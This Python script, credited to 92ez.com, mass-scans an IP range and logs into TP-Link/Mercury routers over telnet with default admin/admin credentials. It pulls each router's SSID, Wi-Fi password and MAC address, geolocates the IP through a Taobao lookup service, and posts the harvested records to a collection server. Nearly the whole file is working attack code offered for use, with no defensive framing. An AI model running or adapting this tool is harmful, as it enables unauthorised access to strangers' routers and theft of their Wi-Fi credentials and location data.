#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com

from threading import Thread
from telnetlib import Telnet
import requests
import queue
import json
import sys
import os


def ip2num(ip):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]


def num2ip(num):
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24, (num & 0x00ff0000) >> 16, (num & 0x0000ff00) >> 8, num & 0x000000ff)


def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]


def b_thread(ip_list):
    thread_list = []
    queue_list = queue.Queue()
    hosts = ip_list
    for host in hosts:
        queue_list.put(host)
    for x in range(0, SET_THREAD):
        thread_list.append(tThread(queue_list))
    for t in thread_list:
        try:
            t.daemon = True
            t.start()
        except:
            pass
    for t in thread_list:
        t.join()


class tThread(Thread):
    def __init__(self, queue_list):
        Thread.__init__(self)
        self.queue_list = queue_list

    def run(self):
        while not self.queue_list.empty():
            host = self.queue_list.get()
            try:
                getinfo(host)
            except Exception as e:
                continue


def get_position_by_ip(host):
    try:
        ip_url = "http://ip.taobao.com/service/getIpInfo.php?ip=" + host
        header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"}
        json_data = requests.get(url=ip_url, headers=header, timeout=5).json()
        info = [json_data['country'], json_data['region'], json_data['city'], json_data['isp']]
        return info
    except Exception as e:
        print(e)


def getinfo(host):

    email = "1@q.com"
    userkey = "533c5860eb77209af901d8bf300d7ec3"

    username = "admin"
    password = "admin"
    telnet_timeout = 15
    cmd_timeout = 5

    try:
        t = Telnet(host, timeout=telnet_timeout)

        t.read_until("username:", cmd_timeout)
        t.write(username + "\n")
        t.read_until("password:", cmd_timeout)
        t.write(password + "\n")

        t.write("wlctl show\n")
        t.read_until("SSID", cmd_timeout)
        wifi_str = t.read_very_eager()

        t.write("lan show info\n")
        t.read_until("MACAddress", cmd_timeout)
        lan_str = t.read_very_eager()

        t.close()

        if len(wifi_str) > 0:
            # clear extra space
            wifi_str = "".join(wifi_str.split())
            wifi_str = wifi_str.decode('utf8')
            # get SID KEY MAC
            wifi_ssid = wifi_str[1:wifi_str.find('QSS')]
            wifi_key = wifi_str[wifi_str.find('Key=') + 4:wifi_str.find('cmd')] if wifi_str.find('Key=') != -1 else '无密码'
            router_mac = lan_str[1:lan_str.find('__')].replace('\r\n', '')

            position_data = get_position_by_ip(host)
            country = position_data[0]
            province = position_data[1]
            city = position_data[2]
            isp = position_data[3]

            wifi_data = {
                "host": host, "mac": router_mac, "wifikey": wifi_key,
                "ssid": wifi_ssid, "country": country, "province": province,
                "city": city, "isp": isp, "email": email,
                "key": userkey
            }

            save_data_to_server(wifi_data)
    except:
        pass


def save_data_to_server(wifi_data):
    save_url = 'http://localhost/tplink/savedata.php'
    try:
        save_result = json.loads(requests.post(url=save_url, data=wifi_data).text)
        if save_result['code'] != 0:
            print(save_result['msg'])
        else:
            print(save_result['msg'])
    except Exception as e:
        save_data_to_server(wifi_data)

if __name__ == '__main__':
    print('==========================================')
    print(' Scan TPLINK(MERCURY) wifi key by telnet')
    print('           Author 92ez.com')
    print('==========================================')

    global SET_THREAD

    SET_THREAD = int(sys.argv[1])
    begin_ip = sys.argv[2].split('-')[0]
    end_ip = sys.argv[2].split('-')[1]
    ip_list = ip_range(begin_ip, end_ip)
    current_pid = os.getpid()

    print('\n[*] Total ' + str(len(ip_list)) + " IP...")
    print('\n================ Running =================')

    try:
        b_thread(ip_list)
    except KeyboardInterrupt:
        print('\n[*] Kill all thread.')
        os.kill(current_pid, 9)
